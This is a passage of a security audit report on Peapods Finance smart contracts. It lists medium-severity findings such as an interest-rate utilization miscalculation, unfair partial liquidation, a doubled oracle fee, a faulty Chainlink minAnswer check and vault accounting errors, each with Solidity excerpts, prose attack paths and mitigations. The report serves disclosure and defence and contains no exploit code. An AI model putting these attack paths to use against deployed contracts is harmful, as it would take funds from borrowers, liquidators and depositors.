uint256 _totalAssetsAvailable = _totalAssetAvailable(totalAsset, totalBorrow, true);
_prevUtilizationRate = _totalAssetsAvailable == 0 ? 0 : (UTIL_PREC * totalBorrow.amount) / _totalAssetsAvailable;
```

The first line gets the `_totalAssetsAvailable` from the following function shown below: 
```solidity
function _totalAssetAvailable(VaultAccount memory _totalAsset, VaultAccount memory _totalBorrow, bool _includeVault)
  internal
  view
  returns (uint256)
  {
    if (_includeVault) {
    return _totalAsset.totalAmount(address(externalAssetVault)) - _totalBorrow.amount;
  }
        ...
```

Here, the total asset in the contract plus the ones in the vault is subtracted by the total amount that is borrowed from the contract. 

If we take this into consideration, the formula for the Utilization Rate becomes: 

$$UtilizationRate = \frac{totalBorrow.amount}{totalAmountOfAssets - totalAssetsBorrowed}$$

Hence, the utilization rate becomes the ratio between total borrowed amount to total assets that are **currently** available in the contract to be lent out. This was communicated with the protocol and they agree that this is the wrong formula. 

The correct equation should be the ratio between total borrowed amount to the total borrowed + un-borrowed amount in the pair. 

Let's look at an example to understand this better, 

Let's take a Pair of tokens `X` asset, and `Y` collateral. 
* We have `100 X` assets, and `100 Y` collateral. 
* `50 X` assets have been borrowed by Alice.
* Now the pair has `50 X` assets, and `100 Y` collateral. 

Let's calculate the utilization rate: 

**Current Formula:** 

$$UtilizationRate = \frac{totalBorrow.amount}{totalAmountOfAssets - totalAssetsBorrowed} = \frac{50}{100-50} = 1.0$$

This gives a `100%` utilization rate. 

**Corrected Formula:** 

$$UtilizationRate = \frac{totalBorrow.amount}{totalAmountOfAssets} = \frac{50}{100} = 0.5$$

This gives a `50%` utilization rate. 

In this example, the rate change is `100-50 = 50%`, so it can trigger interest accrual even when it is not required. To understand the full impact of this error, we need to know the different types of interest a user can create for their Pairs of token. 

1. Linear Interest Rate: This interest is a simple linear interest following the equation `y = mx + c`, it has a vertex utilization after which the interest rate increases more rapidly. 
2. Variable Interest Rate: This interest is a more complicated interest rate that changes the `vertex` and `max interest` dynamically with the utilization. 

The problem occurs because if you call the `addInterest` function and update the interest rates when it is not required, you can steal more interest from the borrowers than necessary. This is shown in the Attack Path section below. 

### Internal Pre-conditions

A Fraxlend Pair is created. 

### External Pre-conditions

A user calls the `addInterest` function to update the interest states. 

### Attack Path
1. A FraxLend Pair is created with a variable interest rate with `60 MIN_TARGET_UTIL`, and `70 MAX_TARGET_UTIL`.  Interest rate of `1%` minimum, `2%` vertex, and `15%` maximum. 
2. `100` assets are deposited and `50` are loaned out to borrowers. 
3. Nothing changes, and the user calls `addInterest` to update interest rates. This can be called every block. 

From this point forward, lets look at the current method and the correct method to check state changes: 

**Current:**
Everyday the function is called with no change in utilization: 
The function calculates the current full utilization rate by: 
```solidity
function getFullUtilizationInterest(uint256 _deltaTime, uint256 _utilization, uint64 _fullUtilizationInterest)
        ...
        if (_utilization < MIN_TARGET_UTIL) {
            // 18 decimals
            uint256 _deltaUtilization = ((MIN_TARGET_UTIL - _utilization) * 1e18) / MIN_TARGET_UTIL;
            // 36 decimals
            uint256 _decayGrowth = (RATE_HALF_LIFE * 1e36) + (_deltaUtilization * _deltaUtilization * _deltaTime);
            // 18 decimals
            _newFullUtilizationInterest = uint64((_fullUtilizationInterest * (RATE_HALF_LIFE * 1e36)) / _decayGrowth);
        }
```

For our situation, we will get `_newFullUtilizationInterest = 0.14210526315789473`. 

And using this they calculate the `_newRatePerSec`: 
```solidity
uint256 _vertexInterest =
            (((_newFullUtilizationInterest - ZERO_UTIL_RATE) * VERTEX_RATE_PERCENT) / RATE_PREC) + ZERO_UTIL_RATE;
        if (_utilization < VERTEX_UTILIZATION) {
            // 18 decimals
            _newRatePerSec =
                uint64(ZERO_UTIL_RATE + (_utilization * (_vertexInterest - ZERO_UTIL_RATE)) / VERTEX_UTILIZATION);
```

Which will give us `_newRatePerSec = 0.02048454469507101`. This will be used to calculate the interest for each borrower and the interest is charged. 

If you call this daily for 30 days, the `_newRatePerSec` will decrease slowly as shown below: 
```bash 
0.02048454469507101
0.019890955458822496
...
0.011688161515964891
0.011557539815458803
```
On average, a person will pay `0.014938491983740592 ` or `1.4938%` interest. 

**Correct:** 
In the correct implementation of this hypothetical situation, the borrowers will only need to pay interest once in the 30 days at the end *if* utilization changes, giving them quite a lot less interest of `0.013670634920634922 ` or `1.367%`. 

**In this example alone, the borrower had to pay `0.1268%` interest more than they are required.** 

Another situation can be created for a utilization rate that is greater than the vertex utilization rate. When that is done, the interest rate increases from `12.250%` to `22.89%` in a single day. This can negatively affect the borrowers too, even though there is no change in utilization. Ideally, the utilization will decrease and the interest rate will decrease sequentially, but that will not happen if the utilization remains the same even for a block because the `addInterest` function can be called every block.  

### Impact

This wrong calculation is only used in the calculation of `_prevUtilizationRate`. This variable is only used in the `addInterest` function to calculate whether the interest needs to be updated or not:

```solidity 
uint256 _currentUtilizationRate = _prevUtilizationRate;
uint256 _totalAssetsAvailable = totalAsset.totalAmount(address(externalAssetVault));
uint256 _newUtilizationRate =
    _totalAssetsAvailable == 0 ? 0 : (UTIL_PREC * totalBorrow.amount) / _totalAssetsAvailable;
@> uint256 _rateChange = _newUtilizationRate > _currentUtilizationRate
    ? _newUtilizationRate - _currentUtilizationRate
    : _currentUtilizationRate - _newUtilizationRate;
if (
    _currentUtilizationRate != 0
        && _rateChange < _currentUtilizationRate * minURChangeForExternalAddInterest / UTIL_PREC
) {
    emit SkipAddingInterest(_rateChange);
} else {
    (, _interestEarned, _feesAmount, _feesShare, _currentRateInfo) = _addInterest();
}
```

Due to this, lender can maliciously call the `addInterest` function to increase the amount of interest the borrowers have to pay. They can call the function every block and increase the interest. 

### PoC

_No response_

### Mitigation

_No response_

# Issue M-17: Partial Liquidators can Cause the Last Liquidator to Suffer a Loss 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/349 

## Found by 
pkqs90, prosper, uuzall

### Summary

When a position is liquidated, the liquidators are paid a certain percent of fees. In some positions, partial liquidators will get an unfair shares of the fees when they liquidate first and the final liquidators will be left with small crumbs of fees or even full losses which will cause a lot of insolvent loan positions to never be liquidated. 

### Root Cause

The [`liquidate`](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/fraxlend/src/contracts/FraxlendPairCore.sol#L1100) function allows a third party to repay a borrower's debt if they have become insolvent. The liquidators get paid a percentage of collateral as fees when they liquidate the position as a bonus: 
```solidity 
function liquidate(uint128 _sharesToLiquidate, uint256 _deadline, address _borrower)
       ...

  uint256 _optimisticCollateralForLiquidator =
@>    (_liquidationAmountInCollateralUnits * (LIQ_PRECISION + cleanLiquidationFee)) / LIQ_PRECISION;
  
  _leftoverCollateral = (_userCollateralBalance.toInt256() - _optimisticCollateralForLiquidator.toInt256());
  
  _collateralForLiquidator = _leftoverCollateral <= 0
    ? _userCollateralBalance
@>    : (_liquidationAmountInCollateralUnits * (LIQ_PRECISION + dirtyLiquidationFee)) / LIQ_PRECISION;
  
  if (protocolLiquidationFee > 0) {
    _feesAmount = (protocolLiquidationFee * _collateralForLiquidator) / LIQ_PRECISION;
    _collateralForLiquidator = _collateralForLiquidator - _feesAmount;
```

This bonus is calculated as either the `cleanLiquidationFee` or the `dirtyLiquidationFee` (as shown above) depending on whether the liquidator liquidates the entire position or only a partial position. 

The problem is that in certain situations, liquidators who liquidate the position last will not get their fair share of the collateral tokens. This happens because the final liquidator gets the entirety of the collateral the position holds. 

### Internal Pre-conditions

1. The maxLTV of a Pair is set to `100 - maxLTV ≲ liquidationFees`.
2. Borrower takes out a loan.
3. Borrower's loan becomes insolvent.
4. A series of liquidators partially liquidate the function. 
5. The final liquidator does not get their fair share. 

### External Pre-conditions

1. The borrower's loan becomes insolvent due to various external factors.

### Attack Path

Take the following situation as an example: 
* A loan's `maxLTV` is `95%`, and the `cleanLiquidationFee` is `6%`. 
* The loan while being liquidated has `100` assets, and `105.26` collateral. For simplicity, let's say that the exchange rate is `1:1`. 
* This gives `LTV = 95%`. This will trigger liquidation. 

Now, lets say that `Liquidator_1` comes to partially liquidate half of the position. 

While the position is being liquidated, the following code will trigger: 
```solidity 
_leftoverCollateral = (_userCollateralBalance.toInt256() - _optimisticCollateralForLiquidator.toInt256());

_collateralForLiquidator = _leftoverCollateral <= 0 ? _userCollateralBalance : (_liquidationAmountInCollateralUnits * (LIQ_PRECISION + dirtyLiquidationFee)) / LIQ_PRECISION;
```

The `_collateralForLiquidator` will be set to $50 \times 1.054 = 52.7$. 

So, the liquidator gets transferred the `_userCollateralBalance` of `52.7`. 

Which means the position has the following balances, $Asset = 100 - 50 = 50$, and $Collateral = 105.26 - 52.7 = 52.56$. 

So, the person who liquidates the remaining position will see the following: 
* They transfer in `50` assets, and get `52.56` collateral back. 
* They were promised a `6%` bonus when they agreed to liquidate, which should come out to `53` collateral. 
* **Hence, they suffered a $6 - 5.12 = 0.88$% loss. (Note: $(52.56 - 50)/50 = 5.12$%)**

Let's consider a similar situation with an even larger partial liquidation, 

If the first person liquidated `90%` of the position: 

`Liquidator_1`: Asset: `90`; Collateral: `94.86`

What remains in the position is: 
Asset: `10`; Collateral: `5.14`

This means either the final liquidator needs to suffer an incredible amount of loss or that the protocol will have to deal with the inevitable increase in insolvent loans that will never be liquidated because their collaterals are not enough. 

### Impact

The final liquidators of a position will have to suffer losses if they want to liquidate the position. Their loss will be higher than 0.1%, and may even reach `50%` in certain situations. 

### PoC

_No response_

### Mitigation

_No response_

# Issue M-18: `spTKNMinimalOracle.sol` counts debond fee twice, which will make the end price (spTKN per base) higher than it should be 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/386 

## Found by 
0xSpearmint1, Honour, Silvermist, TessKimy, X77, ZoA, bretzel, exploitabilityexplorer, pkqs90, wickie

### Summary


The `spTKNMinimalOracle::_calculateBasePerPTkn` will count unwrap fee twice, which will make the base per PTkn price lower than what it should be. Eventually the base per PTkn price will be reversed and calculated into spTKN per base price, which will be higher than what it should be.
This inflated price of spTKN can be used to calculate the aspTkn price and in the fraxlend to determine solvency and also in the liquidation process. As the result the liquidator might get more than what they should get.


### Root Cause

`spTKNMinimalOracle::_calculateBasePerPTkn` calculates the PTkn price based on the Tkn price. When it converts from Tkn price to pTkn price, it accounts for CBR and then account for unwrap fee:

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/oracle/spTKNMinimalOracle.sol#L169-L186

However, the `_accountForCBRInPrice` uses `WeightedIndex::convertToAssets`:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/oracle/spTKNMinimalOracle.sol#L243

The `WeightedIndex::convertToAssets` already subtracts the debond fee from the assets returned:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/WeightedIndex.sol#L120-L130

This PTkn price from `convertToAssets` will be accounted for the unwrap fee using `_accountForUnwrapFeeInPrice` which will subtract the debond fee once more:
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/oracle/spTKNMinimalOracle.sol#L246-L253

Also, if the base is pod, it uses `_checkAndHandleBaseTokenPodConfig`, which will as well use these two functions `_accountForCBRInPrice` and `_accountForUnwrapFeeInPrice`. Therefore it will as well count the debond fee twice.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/oracle/spTKNMinimalOracle.sol#L164
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/oracle/spTKNMinimalOracle.sol#L213-L216


### Internal Pre-conditions

Either (does not need to be both)
- `DEBOND_FEE` of the WeightedIndex is set to non-zero
- or the `BASE_IS_POD` and the base has debond fee


### External Pre-conditions

- The `aspTKNMinimalOracle.sol` which inherits from `spTKNMinimalOracle.sol`, is used in the Fraxlend pair to determine the price of `aspTKN` per `borrowTkn`.


### Attack Path

1. liquidator liquidates


### Impact

The price of spTKN per base will calculated higher than it should be. If this incorrect price is used in Fraxlend pair, this incorrect price may be used to determine solvency and the amount of collateral for liquidator:

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/fraxlend/src/contracts/FraxlendPairCore.sol#L232

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/fraxlend/src/contracts/FraxlendPairCore.sol#L1135-L1136

For the solvency, it is result in effectively higher `maxLTV`, so it is less problematic.
But for the calculation of collateral amounts for liquidator, the liquidator may get more collateral than they should get.

### PoC

_No response_

### Mitigation

Consider dropping the `_accountForUnwrapFeeInPrice` 

# Issue M-19: Incorrect `minAnswer` check doesn't protect the protocol from massive price drops 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/426 

## Found by 
TessKimy, X77, pkqs90

### Summary

Incorrect `minAnswer` check doesn't protect the protocol from massive price drops

### Root Cause

In [Chainlink Single Price Oracle](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/oracle/ChainlinkSinglePriceOracle.sol#L117), `minAnswer` and  `maxAnswer` checks are handled incorrectly. Let say Chainlink returns 1e17 `minAnswer` value for ETH/USD pair. It means aggregator will never return lesser this value. But single price oracle checks it's lower than that value or not.

```solidity
        if (_answer > _max || _answer < _min) {
            _isValid = false;
        }
```

In conclusion, this if check will never triggered in time correctly.

### Internal Pre-conditions

No need

### External Pre-conditions

1. Actual price of the assets should be lower than `minAnswer` or higher than `maxAnswer`

### Attack Path

1. I can give an example from LUNA's massive price drop
2. LUNA's price drops through zero
3. Chainlink won't return lower than `minAnswer` value
4. Protocol will use wrong price information and it can't even detect it as bad data

### Impact

This is low likelihood issue but it's happened before in history ( LUNA ). Users can buy from real price in external pools and they can use it as collateral by pairing it with pTKN and then they can borrow asset using this inflated price.

### Mitigation

Decide a reasonable gap for it. Because Chainlink won't update the price of the asset's price is lower than min answer and the last answer doesn't have to be equal to minAnswer value.

minAnswer + gap > returned value

This check is much better than just checking minimum answer

# Issue M-20: LendingAssetVault incorrectly updates vaultUtilization if CBR for a single FraxlendPair decreases. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/440 

## Found by 
Honour, RampageAudit, TessKimy, X77, cu5t0mPe0, exploitabilityexplorer, future2\_22, octopus\_testjjj, pkqs90, super\_jack


### Summary

LendingAssetVault incorrectly updates vaultUtilization if CBR for a single FraxlendPair decreases.

### Root Cause

`_updateAssetMetadataFromVault()` function is used to update the `vaultUtilization` for a single vault (FraxlendPair). The bug is if the vault's CBR (asset/share ratio) is decreasing, the formula is incorrect.

For example, if the previous vault CBR is 1.5e27, the current is 1e27, the decrease should be `(1.5e27 - 1e27) / 1.5e27 = 33%`, but currently it is `(1.5e27 / 1e27) - 1 = 50%`. This is totally wrong, and would result in a lower CBR, which results in users receiving less assets, effectively losing funds.

Another example, if we plug in `1.5e27 -> 0.75e27` (a supposedly 50% decrease), the current formula would end up in a 100% decrease, which means the CBR would end up in zero.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/LendingAssetVault.sol#L287

```solidity
    function _updateAssetMetadataFromVault(address _vault) internal {
        uint256 _prevVaultCbr = _vaultWhitelistCbr[_vault];
        _vaultWhitelistCbr[_vault] = IERC4626(_vault).convertToAssets(PRECISION);
        if (_prevVaultCbr == 0) {
            return;
        }
        uint256 _vaultAssetRatioChange = _prevVaultCbr > _vaultWhitelistCbr[_vault]
@>          ? ((PRECISION * _prevVaultCbr) / _vaultWhitelistCbr[_vault]) - PRECISION
            : ((PRECISION * _vaultWhitelistCbr[_vault]) / _prevVaultCbr) - PRECISION;

        uint256 _currentAssetsUtilized = vaultUtilization[_vault];
        uint256 _changeUtilizedState = (_currentAssetsUtilized * _vaultAssetRatioChange) / PRECISION;
        vaultUtilization[_vault] = _prevVaultCbr > _vaultWhitelistCbr[_vault]
            ? _currentAssetsUtilized < _changeUtilizedState ? 0 : _currentAssetsUtilized - _changeUtilizedState
            : _currentAssetsUtilized + _changeUtilizedState;
        _totalAssetsUtilized = _totalAssetsUtilized - _currentAssetsUtilized + vaultUtilization[_vault];
        _totalAssets = _totalAssets - _currentAssetsUtilized + vaultUtilization[_vault];
        emit UpdateAssetMetadataFromVault(_vault, _totalAssets, _totalAssetsUtilized);
    }
```

### Internal pre-conditions

- CBR for a FraxlendPair decreases, e.g. due to bad debt liquidation.

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

Users would receive less assets.

### PoC

N/A

### Mitigation

Use the correct formula: `PRECISION - ((PRECISION * _prevVaultCbr) / _vaultWhitelistCbr[_vault]);` for the decreasing scenario.

# Issue M-21: LendingAssetVault should also call `_updateInterestAndMdInAllVaults()` in multiple functions. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/454 

## Found by 
X77, future2\_22, pkqs90


### Summary

In LendingAssetVault.sol, There are four functions that should call `_updateInterestAndMdInAllVaults()` when it didn't:

1. whitelistWithdraw
2. whitelistDeposit
3. depositToVault
4. redeemFromVault

This would lead to inaccurate interest for FraxlendPairs.

### Root Cause

`_updateInterestAndMdInAllVaults()` function is used to trigger an interest update for all FraxlendPairs. Each FraxlendPair's interest rate depends on the utilization rate. The utilization rate depends on the amount of assets within the FraxlendPair and in LVA.

So if the asset amount of the LVA changes, each FraxlendPair should also update their interest.

This is the case for `deposit()` and `withdraw()` function of the LVA (`_updateInterestAndMdInAllVaults()` is always triggered). But there are four more functions that changes amount of LVA assets.

First two is `whitelistWithdraw()` and `whitelistDeposit()`. This is used by a single FraxlendPair if assets are transferred between the FraxlendPair and LVA.

Next two is `depositToVault()` and `redeemFromVault()`. This is used by the admin to manually transfer assets to and from a FraxlendPair.

All four functions should also call `_updateInterestAndMdInAllVaults()`, or else the interest for other FraxlendPairs would be inaccurate.

- https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/LendingAssetVault.sol#L230-L254
- https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/LendingAssetVault.sol#L310-L334

```solidity
    function whitelistWithdraw(uint256 _assetAmt) external override onlyWhitelist {
        address _vault = _msgSender();
        _updateAssetMetadataFromVault(_vault);

        // validate max after doing vault accounting above
        require(totalAvailableAssetsForVault(_vault) >= _assetAmt, "MAX");
        vaultDeposits[_vault] += _assetAmt;
        vaultUtilization[_vault] += _assetAmt;
        _totalAssetsUtilized += _assetAmt;
        IERC20(_asset).safeTransfer(_vault, _assetAmt);
        emit WhitelistWithdraw(_vault, _assetAmt);
    }

    /// @notice The ```whitelistDeposit``` function is called by any whitelisted target vault to deposit assets back into this vault.
    /// @notice need this instead of direct depositing in order to handle accounting for used assets and validation
    /// @param _assetAmt the amount of underlying assets to deposit
    function whitelistDeposit(uint256 _assetAmt) external override onlyWhitelist {
        address _vault = _msgSender();
        _updateAssetMetadataFromVault(_vault);
        vaultDeposits[_vault] -= _assetAmt > vaultDeposits[_vault] ? vaultDeposits[_vault] : _assetAmt;
        vaultUtilization[_vault] -= _assetAmt;
        _totalAssetsUtilized -= _assetAmt;
        IERC20(_asset).safeTransferFrom(_vault, address(this), _assetAmt);
        emit WhitelistDeposit(_vault, _assetAmt);
    }

    function depositToVault(address _vault, uint256 _amountAssets) external onlyOwner {
        require(_amountAssets > 0);
        _updateAssetMetadataFromVault(_vault);
        IERC20(_asset).safeIncreaseAllowance(_vault, _amountAssets);
        uint256 _amountShares = IERC4626(_vault).deposit(_amountAssets, address(this));
        require(totalAvailableAssetsForVault(_vault) >= _amountAssets, "MAX");
        vaultDeposits[_vault] += _amountAssets;
        vaultUtilization[_vault] += _amountAssets;
        _totalAssetsUtilized += _amountAssets;
        emit DepositToVault(_vault, _amountAssets, _amountShares);
    }

    /// @notice The ```redeemFromVault``` function redeems shares from a specific vault
    /// @param _vault The vault to redeem shares from
    /// @param _amountShares The amount of shares to redeem (0 for all)
    function redeemFromVault(address _vault, uint256 _amountShares) external onlyOwner {
        _updateAssetMetadataFromVault(_vault);
        _amountShares = _amountShares == 0 ? IERC20(_vault).balanceOf(address(this)) : _amountShares;
        uint256 _amountAssets = IERC4626(_vault).redeem(_amountShares, address(this), address(this));
        uint256 _redeemAmt = vaultUtilization[_vault] < _amountAssets ? vaultUtilization[_vault] : _amountAssets;
        vaultDeposits[_vault] -= _redeemAmt > vaultDeposits[_vault] ? vaultDeposits[_vault] : _redeemAmt;
        vaultUtilization[_vault] -= _redeemAmt;
        _totalAssetsUtilized -= _redeemAmt;
        emit RedeemFromVault(_vault, _amountShares, _redeemAmt);
    }
```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

Interest for FraxlendPairs would be inaccurate.

### PoC

N/A

### Mitigation

Call `_updateInterestAndMdInAllVaults()` for the above four functions.

# Issue M-22: AutoCompoundingPodLp does not work for advanced self-lending pods with podded fTKN as pairedLpTKN. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/468 

## Found by 
pkqs90


### Summary

AutoCompoundingPodLp does not work for advanced self-lending pods with podded fTKN as pairedLpTKN.

### Root Cause

First, let's see how the autocompounding process works: 1) swap rewardTKN -> pairedLpTKN, 2) swap a portion (roughly half) of pairedLpTKN -> pTKN, 3) add pairedLpTKN, pTKN to UniV2 LP, 4) stake LP token to spTKN.

This is supposed to also work for self-lending pods. There are two kinds of self-lending pods. The first is the regular one, where the pairedLpTKN for a pod is a fraxlend paired fTKN. However, there is also an "advanced feature", so the pairedLpTKN is a podded fTKN (which makes it a pfTKN). This can be seen in `LeverageManager.sol` contract when initializing a leverage position.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/lvf/LeverageManager.sol#L60

```solidity
    /// @notice The ```initializePosition``` function initializes a new position and mints a new position NFT
    /// @param _pod The pod to leverage against for the new position
    /// @param _recipient User to receive the position NFT
    /// @param _overrideLendingPair If it's a self-lending pod, an override lending pair the user will use
@>  /// @param _hasSelfLendingPairPod bool Advanced implementation parameter that determines whether or not the self lending pod's paired LP asset (fTKN) is podded as well
    function initializePosition(
        address _pod,
        address _recipient,
        address _overrideLendingPair,
        bool _hasSelfLendingPairPod
    ) external override returns (uint256 _positionId) {
        _positionId = _initializePosition(_pod, _recipient, _overrideLendingPair, _hasSelfLendingPairPod);
    }
```

Now, going back to autocompounding. In step 1, if the pod was a self-lending pod, the rewardTKN -> pairedLpTKN swap is non-trivial, because the liquidity may not be good. So it first swaps rewardTKN to the underlying token, then processes it to the pairedLpTKN.

For a normal self-lending pod, this works well (e.g. swap to USDC, then convert to fUSDC). However, for a podded fTKN as pairedLpTKN, this is not supported. We can see in details how the swap is handled in `_tokenToPairedLpToken()` function.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/AutoCompoundingPodLp.sol#L213

```solidity
    function _tokenToPodLp(address _token, uint256 _amountIn, uint256 _amountLpOutMin, uint256 _deadline)
        internal
        returns (uint256 _lpAmtOut)
    {
@>      uint256 _pairedOut = _tokenToPairedLpToken(_token, _amountIn);
        if (_pairedOut > 0) {
            uint256 _pairedFee = (_pairedOut * protocolFee) / 1000;
            if (_pairedFee > 0) {
                _protocolFees += _pairedFee;
                _pairedOut -= _pairedFee;
            }
            _lpAmtOut = _pairedLpTokenToPodLp(_pairedOut, _deadline);
            require(_lpAmtOut >= _amountLpOutMin, "M");
        }
    }

    function _tokenToPairedLpToken(address _token, uint256 _amountIn) internal returns (uint256 _amountOut) {
        address _pairedLpToken = pod.PAIRED_LP_TOKEN();
        address _swapOutputTkn = _pairedLpToken;
        if (_token == _pairedLpToken) {
            return _amountIn;
        } else if (maxSwap[_token] > 0 && _amountIn > maxSwap[_token]) {
            _amountIn = maxSwap[_token];
        }

        // if self lending pod, we need to swap for the lending pair borrow token,
        // then deposit into the lending pair which is the paired LP token for the pod

        // @audit-bug: This does not support podded fTKN.
@>      if (IS_PAIRED_LENDING_PAIR) {
            _swapOutputTkn = IFraxlendPair(_pairedLpToken).asset();
        }

        address _rewardsToken = pod.lpRewardsToken();
        if (_token != _rewardsToken) {
            _amountOut = _swap(_token, _swapOutputTkn, _amountIn, 0);
            if (IS_PAIRED_LENDING_PAIR) {
                _amountOut = _depositIntoLendingPair(_pairedLpToken, _swapOutputTkn, _amountOut);
            }
            return _amountOut;
        }
        uint256 _amountInOverride = _tokenToPairedSwapAmountInOverride[_rewardsToken][_swapOutputTkn];
        if (_amountInOverride > 0) {
            _amountIn = _amountInOverride;
        }
        uint256 _minSwap = 10 ** (IERC20Metadata(_rewardsToken).decimals() / 2);
        _minSwap = _minSwap == 0 ? 10 ** IERC20Metadata(_rewardsToken).decimals() : _minSwap;
        IERC20(_rewardsToken).safeIncreaseAllowance(address(DEX_ADAPTER), _amountIn);
        try DEX_ADAPTER.swapV3Single(
            _rewardsToken,
            _swapOutputTkn,
            REWARDS_POOL_FEE,
            _amountIn,
            0, // _amountOutMin can be 0 because this is nested inside of function with LP slippage provided
            address(this)
        ) returns (uint256 __amountOut) {
            _tokenToPairedSwapAmountInOverride[_rewardsToken][_swapOutputTkn] = 0;
            _amountOut = __amountOut;

            // if this is a self-lending pod, convert the received borrow token
            // into fTKN shares and use as the output since it's the pod paired LP token

            // @audit-bug: This does not support podded fTKN.
@>          if (IS_PAIRED_LENDING_PAIR) {
                _amountOut = _depositIntoLendingPair(_pairedLpToken, _swapOutputTkn, _amountOut);
            }
        } catch {
            _tokenToPairedSwapAmountInOverride[_rewardsToken][_swapOutputTkn] =
                _amountIn / 2 < _minSwap ? _minSwap : _amountIn / 2;
            IERC20(_rewardsToken).safeDecreaseAllowance(address(DEX_ADAPTER), _amountIn);
            emit TokenToPairedLpSwapError(_rewardsToken, _swapOutputTkn, _amountIn);
        }
    }

```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

AutoCompoundingPodLP does not work for advanced self-lending pods. This essentially means the LVF feature for advanced self-lending pods don't work at all.

### PoC

N/A

### Mitigation

Add support for the feature.


# Issue M-23: AutoCompoundingPodLp `_swapV2()` may lead to leftover tokens in multihops. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/470 

## Found by 
0xpetern, X77, benjamin\_0923, pkqs90, silver\_eth


### Summary

AutoCompoundingPodLp `_swapV2()` may lead to leftover tokens in multihops.

### Root Cause

First, let's see how the autocompounding process works: 1) swap rewardTKN -> pairedLpTKN, 2) swap a portion (roughly half) of pairedLpTKN -> pTKN, 3) add pairedLpTKN, pTKN to UniV2 LP, 4) stake LP token to spTKN.

In step 1, if rewardTKN is not PEAS, it would do a UniV2 swap. The swap path is predefined in `swapMaps[in][out]`. The code supports 2 hops, which is inside the `_swapV2` logic.

The bug here is, for 2 hop swaps, the intermediate tokens may be left stuck in the contract, due to the maxSwap limit.

For example, a swap from tokenA -> tokenB -> tokenC. The first swap gets us 10000 tokenB, but we have `maxSwap[tokenB] = 1000`, so there would be 9000 tokenB leftover in the contract.

For future swaps, unless the tokenB output is 0, which is very unlikely to happen, these 9000 tokenB would be forever stuck in the contract.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/AutoCompoundingPodLp.sol#L213

```solidity
    function _tokenToPairedLpToken(address _token, uint256 _amountIn) internal returns (uint256 _amountOut) {
        ...
        address _rewardsToken = pod.lpRewardsToken();
        if (_token != _rewardsToken) {
@>          _amountOut = _swap(_token, _swapOutputTkn, _amountIn, 0);
            if (IS_PAIRED_LENDING_PAIR) {
                _amountOut = _depositIntoLendingPair(_pairedLpToken, _swapOutputTkn, _amountOut);
            }
            return _amountOut;
        }
        ...
    }

    function _swap(address _in, address _out, uint256 _amountIn, uint256 _amountOutMin)
        internal
        returns (uint256 _amountOut)
    {
        Pools memory _swapMap = swapMaps[_in][_out];
        if (_swapMap.pool1 == address(0)) {
            address[] memory _path1 = new address[](2);
            _path1[0] = _in;
            _path1[1] = _out;
            return _swapV2(_path1, _amountIn, _amountOutMin);
        }
        bool _twoHops = _swapMap.pool2 != address(0);
        address _token0 = IUniswapV2Pair(_swapMap.pool1).token0();
        address[] memory _path = new address[](_twoHops ? 3 : 2);
        _path[0] = _in;
        _path[1] = !_twoHops ? _out : _token0 == _in ? IUniswapV2Pair(_swapMap.pool1).token1() : _token0;
        if (_twoHops) {
            _path[2] = _out;
        }
@>      _amountOut = _swapV2(_path, _amountIn, _amountOutMin);
    }

    function _swapV2(address[] memory _path, uint256 _amountIn, uint256 _amountOutMin)
        internal
        returns (uint256 _amountOut)
    {
        bool _twoHops = _path.length == 3;
        if (maxSwap[_path[0]] > 0 && _amountIn > maxSwap[_path[0]]) {
            _amountOutMin = (_amountOutMin * maxSwap[_path[0]]) / _amountIn;
            _amountIn = maxSwap[_path[0]];
        }
        IERC20(_path[0]).safeIncreaseAllowance(address(DEX_ADAPTER), _amountIn);
        _amountOut =
            DEX_ADAPTER.swapV2Single(_path[0], _path[1], _amountIn, _twoHops ? 0 : _amountOutMin, address(this));
        if (_twoHops) {
            // @audit-bug: There may be leftovers.
@>          uint256 _intermediateBal = _amountOut > 0 ? _amountOut : IERC20(_path[1]).balanceOf(address(this));
@>          if (maxSwap[_path[1]] > 0 && _intermediateBal > maxSwap[_path[1]]) {
                _intermediateBal = maxSwap[_path[1]];
            }
            IERC20(_path[1]).safeIncreaseAllowance(address(DEX_ADAPTER), _intermediateBal);
            _amountOut = DEX_ADAPTER.swapV2Single(_path[1], _path[2], _intermediateBal, _amountOutMin, address(this));
        }
    }
```

### Internal pre-conditions

- maxSwap[] is set for the intermediate token

### External pre-conditions

N/A

### Attack Path

No attack path required. Explained above.

### Impact

Intermediate token is stuck in contract, leading to loss of rewards.

### PoC

N/A

### Mitigation

Always use entire balance of intermediate token for swap.


# Issue M-24: spTKNMinimalOracle uses DIA oracle which only supports /USD pairs, which incorrectly assumes all stablecoins are priced at 1 USD. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/474 

## Found by 
pkqs90


### Summary

